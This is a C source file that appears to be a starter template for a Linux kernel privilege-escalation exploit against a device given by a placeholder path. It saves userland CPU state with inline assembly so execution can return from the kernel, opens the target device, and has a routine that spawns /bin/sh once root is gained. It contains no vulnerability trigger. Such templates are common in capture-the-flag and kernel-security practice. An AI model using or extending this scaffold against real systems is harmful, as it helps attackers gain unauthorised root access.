#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

static const char *device_path = "{device_path}";
static int device_fd = -1;

static uint64_t user_cs;
static uint64_t user_ss;
static uint64_t user_rflags;
static uint64_t user_sp;

static void save_userland_state() {
    __asm__ (
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushfq;"
        "pop user_rflags;"
    );
    puts("[+] Saved userland state");
}

static void spawn_shell() {
    uid_t uid = getuid();
    printf("[+] Returned to userland with uid=%d\n", uid);
    if (uid != 0) {
        fputs("[-] Privilege escalation failed\n", stderr);
        exit(1);
    }
    execl("/bin/sh", "sh", NULL);
    exit(0);
}

static void open_device() {
    device_fd = open(device_path, O_RDWR);
    if (device_fd < 0) {
        puts("[-] Failed to open device!");
    }
    printf("[+] Opened %s\n", device_path);
}

int main() {
    save_userland_state();
    open_device();
    // Happy hacking!
    return 0;
}
